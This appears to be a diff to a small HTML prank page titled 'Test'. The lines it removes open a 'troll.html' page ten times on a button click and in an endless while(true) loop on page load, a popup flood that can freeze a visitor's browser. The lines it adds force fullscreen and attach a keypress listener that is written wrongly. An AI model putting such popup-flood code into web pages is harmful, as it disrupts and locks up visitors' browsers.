@@ -3,10 +3,23 @@
 <title>Test</title>
 </head>
 <body>
-<button onclick = "window.open('http://glorifiedelbow.com/randomtests/troll.html');window.open('http://glorifiedelbow.com/randomtests/troll.html');window.open('http://glorifiedelbow.com/randomtests/troll.html');window.open('http://glorifiedelbow.com/randomtests/troll.html');window.open('http://glorifiedelbow.com/randomtests/troll.html');window.open('http://glorifiedelbow.com/randomtests/troll.html');window.open('http://glorifiedelbow.com/randomtests/troll.html');window.open('http://glorifiedelbow.com/randomtests/troll.html');window.open('http://glorifiedelbow.com/randomtests/troll.html');window.open('http://glorifiedelbow.com/randomtests/troll.html');", id = "b">Click me! </button>
+<button onclick = "openFullscreen();", id = "b">Click me! </button>
 <script>
-while(true)
-window.open('http://glorifiedelbow.com/randomtests/troll.html');
+elem = document.documentElement;
+function openFullscreen() {
+  if (elem.requestFullscreen) {
+    elem.requestFullscreen();
+  } else if (elem.mozRequestFullScreen) { /* Firefox */
+    elem.mozRequestFullScreen();
+  } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
+    elem.webkitRequestFullscreen();
+  } else if (elem.msRequestFullscreen) { /* IE/Edge */
+    elem.msRequestFullscreen();
+  }
+}
+
+elem.addEventListener("keypress", alert("key pressed"));
+
 </script>
 </body>
 </html>
